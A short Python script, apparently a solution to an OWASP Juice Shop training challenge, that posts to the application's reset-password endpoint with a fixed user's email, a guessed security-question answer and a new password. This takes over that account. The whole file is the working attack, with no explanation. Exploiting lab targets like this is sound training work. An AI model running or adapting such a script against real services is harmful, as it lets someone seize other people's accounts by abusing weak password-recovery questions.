import requests
import os
from dotenv import load_dotenv
import json as JSON

load_dotenv();


base_url  = os.environ.get('BASE_URL')

url  = f"{base_url}/rest/user/reset-password"

my_object = {
    "email":"bjoern@owasp.org",
    "answer":"Zaya",
    "new":"12345",
    "repeat":"12345"
}

def get_result(url, obj):
    try:
        p = requests.post(url=url, json=obj)
        return JSON.dumps(p.json(), indent=4);
    except Exception as error:
        print(error);
        
        
print(get_result(url, my_object));